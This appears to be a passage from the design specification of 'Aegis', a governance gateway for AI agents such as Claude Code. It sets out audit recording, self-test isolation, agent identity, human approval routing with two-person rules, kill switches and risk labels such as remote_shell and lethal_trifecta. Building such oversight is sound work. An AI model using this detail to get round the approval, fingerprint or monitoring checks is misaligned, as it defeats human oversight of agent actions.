- **Pricing.** Surface handlers price usage before calling `complete()`: `outcome.usage.cost_usd = rt.ledger.price(outcome.model_used or interaction.model, usage)`, which core does on the model path. BUD-01 `on_complete` prices when `cost_usd == 0`. `complete()` prices once more if it is still 0 and the usage is non-empty. All three use the same `rt.ledger.price`, so the result is identical. The pricing version goes into BUD-01's `Decision.meta["pricing_version"]`.
- **Normalisation** (budgets-ledger + adapters):
  - `Usage.input_tokens` = total input **including** cache reads and cache writes. Anthropic: `input_tokens + cache_read_input_tokens + cache_creation_input_tokens`. OpenAI: `prompt_tokens`. Pricing subtracts the cache counts.
  - Ollama `compute_s` = `(load_duration + prompt_eval_duration + eval_duration)/1e9`. If that is missing, use wall time.
- **Record.** After the `on_complete` hooks, `pipeline.complete()` writes:
  - `rt.audit.record(AuditEvent(event_type="decision", decision_id=<request verdict id>, request_id, session_id, actor=ctx.identity, model=outcome.model_used, usage=outcome.usage, data={"phase": "outcome", "status_code", "upstream_ms", "provider", "model_used", "error", "response_decision_id"}))`.
  - audit-metrics treats `data.phase == "outcome"` as an **update of the existing `decisions` row**, setting `cost_usd`, `tokens` and `upstream_ms`. It never creates a new decision row and never counts the record as a decision.
- **Prometheus.** `aegis_cost_usd_total{team,agent,provider}` is incremented from that outcome record, which carries the identity. `rt.metrics.observe_upstream(provider, model, seconds, usage)` feeds only `aegis_upstream_duration_seconds` and `aegis_tokens_total`.
- **Response-hop rows** carry `upstream_ms` only (`cost_usd`/`tokens` = null). `ctx.state["core.outcome"]` may still be set before the response evaluation for display, but stats sum cost **only** from request-hop rows.
- **No SSE re-publish** of the decision. The drawer and `/api/decisions` show the cost.
- **Tool hops** follow the same path (A-13 "completion").
- Refs: P01-#2, P07-G4, P07-G5, P14-G5.

**A-09 · Dry-run and self-test isolation.**
- **`ctx.dry_run`** means no audit, no bus `decision`, no approvals, no budget reservations, no EXE-04 rate/loop/step recording, no EXE-03 taint flags, no MCP pin writes, and no `signature_hits` rows. Metrics: only `observe_overhead`.
- **`ctx.source == "selftest"`** (always `dry_run`) adds the following. Stateful controls evaluate against **empty state**:
  - BUD-01/BUD-02 see a zero ledger and zero concurrency. Static limit logic still applies, so a candidate `usd: 0` still blocks.
  - EXE-04 **ignores the kill switch** and all loop/rate history. Kill-switch behaviour is covered by `tests/cases`.
  - EXE-03 sees no taint. MCP-03 sees no pins and returns `None`.
  - The pipeline does **not skip the semantic phase** after a deterministic block, so attributed tests of semantic/hybrid controls are meaningful.
- Refs: P07-G9, P17-G5, P18-D, P02-#5.

**A-10 · Large mutation values are elided outside memory.** When persisting `data.detail`, serving `GET /api/decisions/{id}`, or publishing on the bus, any `Mutation.value` string longer than 512 chars becomes `{"$elided": true, "sha256": "<hex16>", "len": <n>}`. The in-memory `WireView` keeps the full value. Owners: core-gateway (record payload) and audit-metrics (persist/API). Ref: P04-G3.

**A-11 · Playground evaluations are recorded.**
- `POST /api/playground` always evaluates **non-dry** with `source="playground"`, including `send: false`, so judges' ad-hoc prompts show in the live feed and `/api/decisions/{decision_id}` resolves.
- With `send: false`, the handler calls `complete(ctx, i, v, Outcome(status_code=200, usage=Usage(requests=0)))`, which releases reservations.
- Ref: P16-G6.

**A-12 · `/v1/guard` extras.**
- **`interaction.destination`** accepts a `Destination` object **or a string**:
  - a `DestClass` value → `Destination(name=f"guard:{v}", dest_class=v)`;
  - a provider name → that provider's destination.
- `interaction.meta.artifact_b64` + `meta.filename`: decoded into `Interaction.raw` (bytes) for `surface="artifact.file"`, never into segments.
- `interaction.meta.raw_result` → `Interaction.raw` (one tool definition) for `surface="mcp.list"`.
- `dry_run` follows A-03/A-09.
- `approval_id` (body) is equivalent to `X-Aegis-Approval`.
- Refs: P17-G4, P19-G-C2, P19-G-C3, P18-F, P13-#3.

**A-13 · Interaction conventions per surface.** These are binding for every producer and consumer.
- **Model adapters:**
  - `meta.wire ∈ {anthropic, openai, ollama}`, `meta.stream`, `meta.body_bytes`, `meta.n_messages`, `destination.provider`.
  - `meta.client = "claude-code"` when the user-agent starts with `claude-cli`, or `x-app: cli`, or `x-claude-code-session-id` is present.
  - `Interaction.headers` = the **complete outbound header set**: lower-case, minus hop-by-hop and `x-aegis-*`, with credential values masked as `"<redacted>"`.
  - `Interaction.raw` = the parsed JSON body. `target="body"` mutations are applied **after** `apply_segments`. `target="header"` mutations are applied to the forwarded set **before** credential passthrough/injection.
  - Anthropic `system` → role `system`, `redactable=False` for Claude Code clients unless `providers.<p>.redact_system: true`.
  - `thinking` / `redacted_thinking` → `redactable=False`.
  - `tool_result` → role `tool_result`, `trusted=False`.
  - Tool definitions, `cache_control` and `metadata` are never segments and are never modified, except for DLP-03 body mutations such as `metadata.user_id`.
  - Segments come in body order with `messages[i]…` paths.
- **Claude Code** (hook and model path): `meta.claude_code = {session_id, prompt_id, request_class, agent_id, tool_use_id, raw_tool_name, hook_event, permission_mode}`. These are copied from the `x-claude-code-*` headers and the hook JSON when present. Hook `cwd` → `meta.cwd`.
- **`model.admin`** (`/ollama/api/{pull,create,push,delete,copy}`):
  - `kind="model_call"`, `destination=local` (`:cloud` → remote), `model = body.model or body.name`.
  - `tool_name = f"ollama.{op}"`, `tool_args` = the parsed body. String leaves become `tool_args` segments, except `tool_args.modelfile` → role `document`, `trusted=False`.
  - `url = "/api/{op}"`, `http_method`, **`meta.op`** (canonical key).
  - Blocked → `403 {"error": "[Aegis] Blocked by <ID>: <reason>", "aegis": {inner}}` (the Ollama CLI prints `error`). Killed → 429.
- **`artifact.file`:**
  - Bytes go in `raw` (in-process) or `meta.artifact_b64` (`/v1/guard`), **never** in segments.
  - `direction="in"`; `meta.filename`, `meta.source`, `meta.source_url`, `meta.sha256`, `meta.truncated`.
  - `kind` = the producing handler's kind: `model_call` for `POST /ollama/api/blobs/{digest}` [should] (buffer ≤ 64 MB, else scan the first 16 MB), `egress` for binary `/egress` downloads [should].
- **`egress.request`** (metadata-egress):
  - `tool_name = body.tool_name or f"http.{method.lower()}"`, `http_method`, `url` = the **logical** URL (before `AEGIS_HOST_MAP`).
  - **`tool_args = {"method": "POST", "url": "<logical url>", "json": <parsed JSON body>, "body": "<text body>"}`** (absent keys omitted).
  - `raw` = the outbound body (dict for JSON, else str).
  - `ActionRule.args_match/args_not_match` use **RE2 search** (unanchored) semantics; anchor with `^`/`$`.
- **`mcp.init`:** `tool_args = {"command": [argv…]}` **and** `meta["mcp.command"] = argv`.
- **MCP meta keys:** `mcp.transport`, `mcp.era`, `mcp.session`, `mcp.jsonrpc_id`, `mcp.list_index`, `mcp.pin`, `mcp.registered`, `mcp.command`, `mcp.url`, `mcp.header_mismatch`.
- **`mcp.list`:** one interaction per tool. `raw` = the tool definition; the description is a segment with role `tool_description`, `trusted=False`. The tool is **dropped** when the final action is `block`/`require_approval`, or when a `Mutation(op="remove", path="tool")` (or `path="result.tools[<i>]"`) is present.
- **Untrusted surfaces:** `tool.output`, `mcp.result`, `mcp.list` and `egress.response` segments are `trusted=False` everywhere, including the playground and `/v1/guard`.
- **Holdback** [could]: post-hoc `model.response` verdicts carry `meta.post_hoc=True`. Controls must tolerate it.
- **Completion of tool hops:**
  - The hook calls `rt.pipeline.complete()` for a `PreToolUse` interaction when the matching `PostToolUse` arrives (same `session_id` + `tool_use_id`), or after 600 s with `Outcome(status_code=200)`. It sets `Outcome.error="tool_error"` when the tool result is an error.
  - The MCP proxy completes after `mcp.result`.
  - `/egress` completes after `egress.response`.
- Refs: P01-#5, P04-G1, P04-G5, P05-#3, P07-G3, P07-G6, P10-G2–G4, P11-#1, P11-#2, P12-G4d, P13-#1–#4, P20-#6.

**A-14 · `when` conditions on controls [should].** In pipeline step 2 (Select), a control must also pass `aegis.policy.conditions.control_when_ok(snap, control_id, ctx, interaction)`. Use a guarded import: if the module is missing → `True`. This module joins the §3.3 public import surfaces (owner policy-engine): `compile_condition(expr) -> Condition`, `build_env(ctx, interaction) -> dict`, `control_when_ok(snap, control_id, ctx, interaction) -> bool`. Ref: P02-#8.

**A-15 · Control discovery also covers `aegis.integrations`.** `aegis.core.discovery.create_registry` walks `aegis.controls` **and** `aegis.integrations` (recursive, same rules: `CONTROLS` lists, `_` prefix skipped, duplicate id → first wins). GOV-06 uses this (A-48). No ownership change.

**A-16 · Miscellaneous core decisions.**
- **Routing:** cross-wire routing is unsupported. A `models.routes` entry whose provider wire differs from the inbound wire is skipped. An unroutable model → 400 `invalid_request` in wire format.
- **`count_tokens`:** `/v1/messages/count_tokens` forwards the **dry-run-redacted** body, never the raw one.
- **`Agent.profile`** is informational in this build (shown in the UI, not applied by the pipeline). [could] `snap.compiled["policy-engine:by_profile"]`.
- **Crypto module:** `aegis.core.crypto` is created by core-gateway in `src/aegis/core/crypto.py`.
- **Several apps in one process:** `create_app(settings)` re-binds `get_runtime()` on each start, explicit `Settings` win over env, and `aegis.settings.get_settings.cache_clear()` is public.
- **SSE:** `/api/events` must not be gzipped or buffered (`Cache-Control: no-cache`, `X-Accel-Buffering: no`).
- **UI:** `ui.py` serves the SPA fallback for deep links (`/ui/security/decisions/dec_…`).
- **Health:** `/healthz` `components` adds `policy` (from `rt.policy.status()["state"]` when present), `semantic`, `ollama` (A-44), `org` (`rt.org.health()` when present) and `audit` (`rt.audit.last_verify`).
- Refs: P01-#3, P01-#4, P01-#9, P01-#11, P02-#9, P02-#14, P18-H, P15-G12, P08-notes.

---

### A.2 Identity, sessions and headers

**A-17 · Agent key carriers and Claude Code identity** (owners: org-rbac, core-gateway, claude-code-integration).
- **Credential sources**, first value starting with `aegis_` wins: `Authorization: Bearer` > `x-api-key` > **`X-Aegis-Agent-Key`** (new) > `X-Aegis-Key` (staging alias). All of them, plus every `x-aegis-*` header, are consumed and **stripped** before any upstream. Non-`aegis_` credentials pass through untouched.
- **Claude Code** (`demo/claude/settings.json` `env`):
  - `ANTHROPIC_CUSTOM_HEADERS` = `"X-Aegis-Agent: claude-code@platform\nX-Aegis-Agent-Key: <seed key>"`. Model traffic is then authenticated while `Authorization` keeps the OAuth token.
  - Hooks and MCP send `Authorization: Bearer <key>` and `X-Aegis-Agent: claude-code@platform`.
  - The hook client reads the key from `AEGIS_AGENT_KEY` or `AEGIS_AGENT_KEY_FILE` (`demo/claude/.agent_key`).
- **`rt.org.resolve_identity()`:**
  - It may return a private subclass `ResolvedIdentity(Identity)` with extra fields `auth_method`, `key_id`, `key_scopes`, `credential_error`, `asserted_agent_id`, `principal_mismatch`, `known` and `principal_active`.
  - Core passes that instance **unchanged** into `new_context(identity=…)` and resolves it **once per inbound request**.
  - The extra fields never reach JSON: they are serialized as `Identity`.
  - Hint `{"client": "claude-code"}` (UA `claude-cli`) maps to `claude-code@platform`.
- **Same identity for hook and MCP proxy.** The hook and the MCP proxy must resolve the same identity for the same call, so approval fingerprints match and duplicate cards are avoided. `demo/claude/mcp.json` therefore sends the same headers.
- Refs: P12-G3, P08-G1, P09-#10, P11-req.

**A-18 · GOV-01 semantics and new error types.**
- An anonymous caller → allow (attribution only).
- An unregistered `X-Aegis-Agent` id → `log`.
- An invalid, revoked or expired key, or principal spoofing (`principal_mismatch`) → block 401 **`unauthenticated`**. A `require_auth: true` violation → 401 `unauthenticated` as well.
- A disabled principal → block 403 `forbidden`.
- When the identity is a plain `Identity` (self-test, playground), GOV-01 checks `(await rt.org.get_agent(agent_id)).active`.
- New `error_type` / API error types: **`unauthenticated` (401)** and **`not_found` (404)**.
- Ref: P08-G6.

**A-19 · Sessions, waits and hook headers.**
- The session precedence in §5.2 stands.
- For Claude Code, `ctx.session_id` = `x-claude-code-session-id` = hook `session_id`. The vault, budgets and loops are keyed on it.
- **`X-Aegis-Wait` / `wait_s`:** an explicit value (including `0`) wins over `approvals.defaults.hold_s[source]`, clamped to **[0, 110] s**.
- Inbound-only headers (never forwarded): **`X-Aegis-Hook-Event`** (hook event name) and **`X-Aegis-Hook-Deadline`** (seconds the client will wait).
- The hook's hold must stay below the hook client timeout, which must stay below the settings `timeout`: 60 < 110 < 120.
- Refs: P18-C, P12-G1.

---

### A.3 Approvals (owner: approvals-engine unless noted)

**A-20 · Two-person rule = owner + admin** [SF-01].
- `two_person: true` means **two distinct eligible approvers**. At least one satisfies `required_role`; the other has role **≥ admin**, or ≥ the level when the level is below admin.
- **Separation of duties:** for `admin`/`owner` levels, the requester's own member (for an agent: its sponsor, `owner_member_id`) never counts.
- **Proposer co-sign:** if the requester is a human whose role already satisfies the level and the route is two-person, their approve vote is recorded at creation (`comment: "proposer co-sign"`). Exactly one more distinct admin+ approver is then needed.
- Any eligible `deny` → `denied`.
- Agents never vote. `self` = the requester's member (an agent's sponsor) **or** any admin/owner.
- Acme keeps **one owner**, so `owner` + two-person = u_katarzyna + one of u_marek / u_emily.
- **GOV-05:** a human proposer who satisfies a **non-two-person** level → `allow`. For a two-person level → `require_approval`, with the co-sign already recorded.
- Refs: P09-#4, P18-G, HANDOFF known issue.

**A-21 · No `auto_approved` status.**
- An `auto` route is stored as `status="approved"`, `required_role="auto"`, `decided_at=created_at`, `votes=[]`, `decided_by=[]`, and `uses=max_uses` for executor kinds. A `deny` route is stored as `status="denied"`, `required_role="deny"`.
- Both still emit `approval.created` + `approval.decided` (`data.sub` = `auto` | `deny_rule`), SSE `approval.created`, and metric outcome `auto` | `deny_rule`.
- The UI derives "auto-approved" from `required_role == "auto"`.
- **Executors also run for auto-approved requests** (A-25).
- Ref: P09-#1.

**A-22 · Routing semantics** (binding for `route()`, `/api/approvals/simulate` and the routing tests).
- **First match wins** (§3.5). Rule lists are **authored most-restrictive-first** with a fail-closed catch-all per family; `docs/seed-fixes/approvals.yaml` is the canonical list.
- With no match: `default_approver` (admin) for `action|budget_raise|mcp_pin`, and **`default_config_approver` (owner)** for `config_change`.
- A config proposal with N changes routes each change and takes the highest level, OR-ing `two_person`, keeping the min `ttl_s` and the `rule_id` of the max.
- **Missing numbers fail closed:** `amount_usd`/`increase_pct` = `None` makes `*_gt` **true** and `*_lte` **false**, so an unknown spend lands on `spend-owner-2p`. ACT-01 `missing_amount: route_as_max` agrees.
- **`labels`:** exact per-key string equality against `interaction.labels ∪ draft.labels ∪ derived facts`.
- **Derived facts.** For actions:
  - `vendor_approved`, `recurring` from `vendor:<id>`;
  - `sensitivity`, `env` from `db:<table>` via `rt.org.resources()`;
  - `dest`, `requester_kind`, `requester_role`.

  For config changes, per change:
  - `control_id`, `control_severity` (max of live and proposed);
  - `loosening` (`"true"`/`"false"`), `scope`, `scope_type` (prefix of `scope`; `global` for the global kill switch), `increase_pct`;
  - `model_dest`, `provider_new` (for `model.allow`), `signature_severity` (for `feed.override`), `requester_is_sponsor` (for `killswitch.*` on `agent:<id>`).
- **`ApprovalWhen` extras** (whitelisted): `profiles` (active `doc.profile`), `labels_in: {key: [values]}`, `signals_any: [..]` (comma-split `labels["signals"]`). **`ApprovalRule` extras:** `aliases`, `grant_ttl_s`, `note`. An unknown condition key → the rule does **not** match (one WARNING per policy version).
- Refs: P09-#2, P09-#3, P10-G6.

**A-23 · Hold, wait, retry and redemption.**
- **Hold:** `ctx.wait_for_approval_s` = the explicit wait (A-19), else `hold_s[source]` (`hook 60, mcp 30, egress 15`, others 0).
- **Still pending after the hold:**

| Surface | Answer |
|---|---|
| hook `PreToolUse` | `permissionDecision: "deny"`, reason `[Aegis] <CTRL>: Approval apr_… pending (needs <role>: <names>) — approve at http://127.0.0.1:8787/ui/governance/approvals?id=apr_…, then retry`. **Never `ask`.** |
| `/mcp/{server}` | JSON-RPC result `{isError: true, content: [{type: text, text: same}], _meta: {"io.aegis/decision": {decision_id, action: "require_approval", control_id, approval_id, required_role, expires_at}}}` |
| `/egress` | 403 `approval_required` envelope + `X-Aegis-Approval-Id` |
| `/v1/guard` | 200 `{verdict, decision_id, segments, approval}` |
| model proxies | 200 synthetic reply (or 403 per `block_response`) + `X-Aegis-Approval-Id` |
| `rt.policy.propose()` | `ApplyResult(status="pending_approval", approval=…)` |

- **Long-poll (new):** `GET /api/approvals/{id}/wait?timeout_s=25` (member+, max 60) → `ApprovalRequest`. It returns 200 when the request is decided or the timeout passes, so check `status`. Unknown id → 404 `not_found`.
- **Retry:**
  - The same call plus **`X-Aegis-Approval: apr_…`**. On `/mcp` this is the HTTP header or `params._meta["io.aegis/approval_id"]`; on `/v1/guard` it is the body field `approval_id`.
  - `find_preapproved` matches **token AND fingerprint**, or fingerprint alone.
  - A token whose fingerprint differs is **rejected**: a new request is created with `payload.replay_of = "apr_X (params mismatch)"`, plus audit `system` `data.sub="approval.token_mismatch"`.
  - **Only `kind="action"` approvals are redeemable.** Config, budget and pin approvals act through executors.
- **Grants:**
  - On approval, `expires_at = decided_at + grant_ttl_s` (rule extra, else `defaults.grant_ttl_s` = 900 s).
  - Grants are single-use (`max_uses: 1`), except that redemptions within **`redeem_window_s` = 30 s** count as one use (hook + MCP proxy).
  - `deny_cooldown_s` = 60: an identical call that was just denied returns the denied request without a new card.
- **Flood caps:** `max_pending` 50 (global) and `max_pending_per_principal` 10. Over the cap, the request is created `denied` with `rule_id="defaults.max_pending"`.
- **Fingerprint** (`hmac_hex(..., purpose="approval")`): its volatile `tool_args` keys are dropped: `description`, `timeout`, `run_in_background` (Bash), `_meta`, `cache_control`, `request_id`, `idempotency_key`. `fp_draft` (non-action kinds) covers `{kind, action_type, principal, payload.patch | payload.changes}`.
- **SDK** (`aegis.sdk`, demo-mocks-docs): on `approval_required`, loop `GET …/wait` until the request is no longer pending (≤ `expires_at`), then retry with `X-Aegis-Approval`. The HTTP timeout must exceed the hold.
- Refs: P09-#8, P12-G5, P18-C, P20-#5.

**A-24 · Approval payload shapes** (`ApprovalRequest.payload`; redacted, never raw secrets/PII).

Every request also gets `payload.routing = {rule_id, aliases, description, facts, eligible: [member_id…], grant_ttl_s}`. Action requests also get `payload.bound = {tool_name, args_masked}` (via `rt.redactor.mask_for_log`, ≤ 2 KB). SSE and list views replace `payload.proposal.yaml` with `{"yaml_sha256", "yaml_bytes"}`; the full payload is only returned by `GET /api/approvals/{id}`.

| Shape | `kind` / `action_type` | `resource` / `labels` | `payload` (beyond routing/bound) | Producer → executor |
|---|---|---|---|---|
| **budget_increase** (dashboard `POST /api/budgets/raise`) | `config_change` / `budget.raise` | `policy:<sha16>` / `{scope, scope_type, dimension, window}` | `{"proposal": {"proposal_id": "pol_…", "sha256", "patch": [PatchOp…], "base_version", "reason", "source": "dashboard"}, "changes": [PolicyChange…], "budget": {"scope": "team:trading", "window": "day", "dimension": "usd", "before": 60, "after": 75, "increase_pct": 25.0}}` | budgets-ledger → `rt.policy.propose(patch=…)` → GOV-05 → policy-engine `config_change` executor |
| **budget_raise** (BUD-01 `on_hard: require_approval`) | `budget_raise` / `budget.override` | `budget:<scope>` / `{scope, scope_type, dimension, window}` | `{"patch": [PatchOp…], "scope", "window", "dimension", "before", "after", "increase_pct", "tripped_by": {"agent_id", "session_id", "request_id", "requested", "used", "limit"}}`; `after = max(before × params.raise_factor (2.0), used + requested)` | BUD-01 → policy-engine `budget_raise` executor (`apply_patch(payload.patch)`) |
| **control_disable** | `config_change` / `control.disable` (also `control.mode`, `control.remove`, `control.action.loosen`) | `policy:<sha16>` / `{control_id, control_severity, loosening: "true"}` | `{"proposal": {…}, "changes": [{"kind": "control.disable", "path": "controls[id=DLP-02].enabled", "control_id": "DLP-02", "before": true, "after": false, "loosening": true, "summary": "disable DLP-02 (Secrets & credentials)"}], "control": {"id", "name", "severity", "owasp"}}` | policy-engine `propose` → `config_change` executor |
| **policy_edit** (Monaco `POST /api/policy/apply`, rollback) | `config_change` / kind of the change with the highest required level (ties: first) | `policy:<sha16>` / `{change_kinds: "a,b", loosening}` | `{"proposal": {"proposal_id", "sha256", "yaml": "<full candidate>", "base_version", "reason", "source"}, "changes": [...], "unified": "<unified diff ≤ 20 KB, each line mask_for_log(line, 400)>"}` | policy-engine → `config_change` executor (YAML only if `base_version` is current, else `{"status": "conflict"}`) |
| **org.role_change** (and other org changes) | `action` / `org.role.promote_admin` \| `promote_owner` \| `demote_admin` \| `demote_owner` (others `org.member.*`, `org.agent.*`) | `member:<id>` / `agent:<id>` / `{category: org, op, to_role?}` | `{"org_change_id": "och_…", "op": "member.update", "target": {"type": "member", "id": "u_piotr", "name": "Piotr Zieliński"}, "patch": {"role": "admin"}, "before": {"role": "member"}}` (emails masked) | org-rbac `create_manual` → org-rbac `action` executor (A-25) |
| **mcp.repin** | `mcp_pin` / `mcp.repin` | `mcp:<server>.<tool>` / `{dest, server, reason: changed\|new}` | `{"server", "tool", "pinned_hash": "<hex>\|null", "new_hash", "diff": {"changed_fields": [...], "description_diff": [...], "params_added": [...], "params_removed": [...]}, "old_description_preview", "new_description_preview"}` (previews masked, ≤ 300 chars) | MCP-03 / mcp-proxy `create_manual` → mcp-proxy `mcp_pin` executor |
| **action** (ACT-01…04, GOV-04, EXE-03, SIG-03, DLP-01 `dlp.release`) | `action` / governed type (A-26) | per A-26 / labels per A-27 | `{"facts": {k: v}, "checks": [{"name", "ok": bool, "detail"}], "agent_note": "<agent-supplied, untrusted>", "explain": {...}}` | control → pipeline → redemption via `find_preapproved` |

The dashboard renders `facts` as a table, `checks` as a pass/fail list, `agent_note` labelled "agent-supplied, untrusted", `diff` for re-pins, and `changes` / `unified` for config. Refs: P17-G3, P07-G8, P02-#3, P08-G2, P08-G3, P11-#5, P16-G2, P10-G9.

**A-25 · Executor registration** (last registration per kind wins; one owner per kind).

| kind | Registered by (in `on_startup`) | Behaviour |
|---|---|---|
| `config_change` | **policy-engine** | Proposal lookup: `payload.proposal.proposal_id` → `policy_proposals` row by `decision_id` → by sha in `resource` → `payload.patch\|yaml`. A patch is rebased onto the current text → `apply_patch`. YAML is applied only if `base_version` is current. `source="approval"`, actor = the last approver, reason `"<reason> · approved by u_emily (apr_…)"` → `{"status": "applied", "policy_version": v}` \| `{"status": "rejected"\|"conflict", "errors"}` |
| `budget_raise` | **policy-engine** | `apply_patch(payload.patch, source="approval")` |
| `mcp_pin` | **mcp-proxy** | Re-pins only if the candidate hash == `payload.new_hash`, else `{"error": "candidate changed"}` |
| `action` | **org-rbac** | Handles `action_type` starting with `org.` only and returns `None` for everything else (data-plane actions have no executor). |

- approvals-engine registers **no** executors. Its fallbacks (`config_change`/`budget_raise` → `rt.policy.apply_patch|apply_yaml`) run only when nobody registered that kind.
- Executors run for **auto-approved** requests too. Results go to `ApprovalRequest.execution`. A failure → audit `approval.executed` `data.ok=false` + bus `system` warning, and the approval stays `approved`.
- budgets-ledger registers nothing.
- A **denied** `mcp_pin` → mcp-proxy marks the tool `quarantined` (bus subscriber) [should].
- The admin endpoint `POST /api/mcp/servers/{s}/tools/{t}/approve` votes on the pending `mcp_pin` approval as the viewer (via `rt.approvals.vote`) when one exists; otherwise it re-pins directly and audits `mcp.tool_changed`.
- Refs: P08-G2, P07-G8, P02 §2.7, P11 §2.7.

**A-26 · Vocabulary additions (§3.4).**
- **Action types:**
  - org changes: `org.member.create`, `org.member.create_admin`, `org.member.create_owner`, `org.member.update`, `org.member.deactivate`, `org.member.deactivate_privileged`, `org.role.promote_admin`, `org.role.promote_owner`, `org.role.demote_admin`, `org.role.demote_owner`, `org.agent.update`, `org.agent.widen_destination`, `org.agent.key`, `org.agent.create`;
  - `tool:<tool_name>` (GOV-04 generic approvals);
  - `agent.goal_drift` (INJ-05, stretch);
  - `dlp.release` (DLP-01 when a matrix cell is `require_approval`);
  - `budget.override` (BUD-01 `budget_raise`) and `mcp.repin` (MCP-03), formalised.
- **Resource prefixes:** `vendor:<id>`, `db:<table>`, `host:<hostname>`, `file:<path>`, `pkg:<eco>/<name>`, `mcp:<server>.<tool>`, `member:<id>`, `agent:<id>`, `policy:<sha16>`, `budget:<scope>`.
- **ID prefixes:** `pol_` (policy proposals, policy-engine) and `och_` (org changes, org-rbac).
- Refs: P08-G3, P10-G11, P05-#7, P11-#5, P02-#4.

**A-27 · Label producers** (`Interaction.labels` / `ApprovalDraft.labels`; string values).

| Label | Values | Producer |
|---|---|---|
| `vendor_approved`, `recurring`, `amount_unknown` | `"true"/"false"`; `none\|monthly\|yearly`; `"true"` | ACT-01 (catalog, price check) |
| `sensitivity`, `env` | `PUBLIC…RESTRICTED`; `prod\|staging` | ACT-02 (from `rt.org.resources()`) |
| `bulk` | `"true"` | ACT-02 (unbounded prod `DELETE`/`UPDATE`), ACT-03 (recipients > `max_recipients`) |
| `data_class` | highest class in the payload; a placeholder counts as its entity's class | ACT-03 |
| `env`, `pattern`, `sandboxed` | `prod\|staging\|mainline\|dev`; `terraform_apply\|kubectl_apply\|git_push_main\|remote_shell\|container_run\|python_exec\|pkg_install`; `"true"/"false"` | ACT-04 / EXE-01 |
| `signals` | comma list: `lethal_trifecta` (EXE-03), `unknown_package` (SIG-03), `peer_initiated` (A2A), `intent_drift` (INJ-05) | as listed. **EXE-03 uses `signals`, not `taint`.** |
| `capability` | `spend\|data_read\|data_write\|external_send\|code_exec\|config\|other` | action-guards, on every classified hop |
| `dest`, `server`, `reason` | destination class; server; `changed\|new` | MCP-03 `mcp_pin` drafts (`dest` replaces `destination`) |
| `scope`, `scope_type`, `dimension`, `window` | budget scope facts | BUD-01 / budgets-ledger |
| `category`, `op`, `to_role` | org change facts | org-rbac |

- **Package installs:** SIG-03 owns the approval for unknown packages (signal `unknown_package` → rule `pkg-unknown`). ACT-04 uses `params.category_actions.package.install: log` in balanced, to avoid double prompts.
- `ApprovalWhen` matching is per A-22.
- `ApprovalSimulateRequest` accepts extra `labels` (A-28).
- Refs: P09-#9, P10-G6, P10-G10, P10-G11.

**A-28 · Approvals API extras, audit sub-types and metrics.**
- **`GET /api/approvals`:**
  - `?mine=true` = requested by the viewer **or** by an agent the viewer sponsors.
  - New `?actionable=true` = pending items the viewer can vote on.
  - `can_vote` / `why_not` are present on list items **and** on `GET /api/approvals/{id}` when a viewer is known.
- **`GET /api/approvals/{id}/wait`:** A-23.
- **`POST /api/approvals/simulate`** accepts the extras `labels`, `profile`, `changes: PolicyChange[]`, `scope_type`, `increase_pct`, `control_id`, `loosening`. It returns `ApprovalRoute` + extra `description`. The requester is built from the org cache, and db/vendor labels are derived exactly as live.
- **`GET /api/approvals/rules`** items include `aliases`.
- **`POST /api/approvals/{id}/approve|deny`:** not eligible → 403 `forbidden` (message = `why_not`); already decided → **409 `conflict`**; unknown → 404 `not_found`.
- **Audit (no new `AuditEventType`):**
  - `approval.decided` `data.sub ∈ {vote, approved, denied, cancelled, auto, deny_rule}`;
  - `approval.executed` `data.sub ∈ {execution, redeemed}`;
  - `system` `data.sub ∈ {approval.token_mismatch, approval.escalated}`.
- **Metrics:** `aegis_approvals_total{kind,outcome}` and `aegis_approvals_pending` are **derived by audit-metrics** from `approval.*` audit events. Owners' `inc()` calls for these names are ignored, so nothing is double counted.
- **Scaffold note:** dashboard pages use page-local `…Ext` types for the extra fields; frozen `types.ts` is unchanged.
- Refs: P17-G2b, P17-G7, P17-req, P09-#7, P09-#12, P10-G6.

---

### A.4 Policy engine (owner: policy-engine unless noted)

**A-29 · Self-test gate: reject only regressions, never live state.**
- **Test set:** `doc.tests` + every `controls[].tests`. A control test without `control:` is attributed to its control.
- **Skipped** (reported as counts/warnings, not failures): tests whose attributed control is unconfigured, `enabled: false`, `mode: off` or not implemented; tests excluded by the `profiles:` extra; multi-step extras (`steps`, `repeat`); tests over the time budget.
- **Comparison is control-scoped.** For an attributed test, `got` = the action of **that control's own decision** in `verdict.decisions` (any mode; `allow` if absent). This is how `control:` / `assert: control` are interpreted, so another control being stricter never fails the test. For an unattributed test, `got = verdict.action`.
- `passed = got == expect or (expect == "allow" and got == "log")`.
- The extras `upstream_must_contain` / `upstream_must_not_contain` check the joined `verdict.segments`. `expect_route` checks `rt.approvals.route(...)`.
- **Sets:**
  - The **gate set** (attributed control of kind deterministic/stateful, or unattributed) runs **before** the swap, with a 2.5 s budget and concurrency 8.
  - The **async set** (semantic/hybrid) runs **after** the swap and never rejects; its failures become a `system` warning and are stored in `last_selftest`.
  - `POST /api/policy/validate` runs both sets (8 s budget).
- **Rejection rule.** A candidate is rejected only if a gate case meets **all** of:
  1. it is must-protect: `expect ∈ {redact, require_approval, block}`;
  2. it failed **looser**: `ACTION_PRECEDENCE[got] < ACTION_PRECEDENCE[expect]`, or an upstream check failed;
  3. it is **new or changed** in this candidate (by `def_hash`), **or** it **passed on the live version** (regression baseline).

  Stricter-than-expected results, failing must-allow cases and pre-existing failures are warnings only. The startup run only sets the baseline.
- **Live state is ignored:** see A-09 (empty ledger/loops/taint/pins, kill switch ignored, semantic phase never skipped).
- **Knob:** extra key **`defaults.selftest_gate: enforce | warn | off`** (default `enforce`).
- **Rejection issue:** `ValidationIssue(path="controls[id=DLP-02].tests[name=…]", line, col, message="self-test DLP-02/<name>: expected block, got log — update the test, or use mode: monitor / enabled: false to loosen this control")`.
- Refs: P02-#5, P07-G9, P10-G8a/b, P11-req, P17-req.

**A-30 · `PolicyTest` extras** (whitelisted; honoured by the runner and by test-suite / redteam adapters).

| Extra | Maps to |
|---|---|
| `model` | `Interaction.model` |
| `url`, `http_method`, `resource`, `action_type`, `labels`, `meta`, `raw`, `mcp_server`, `segments` | the same `Interaction` fields |
| `headers` | `Interaction.headers` **and** `ctx.headers` |
| `role`, `trusted` | role/trust of the `text` segment |
| `direction` | `Interaction.direction` |
| `member` | `Identity(member_id, role from rt.org)` (overrides `agent`) |
| `changes` | `Interaction.meta["changes"]` (kind `config_change`) |
| `profile` | the candidate profile for this test |
| `profiles` | run only under the listed profiles |
| `expect_route` | `{required_role, two_person?, rule?}` |
| `upstream_must_contain`, `upstream_must_not_contain` | checks on outbound segments |
| `assert` | `control` (= the default attributed semantics) |
| `steps`, `repeat` | [could]; skipped |

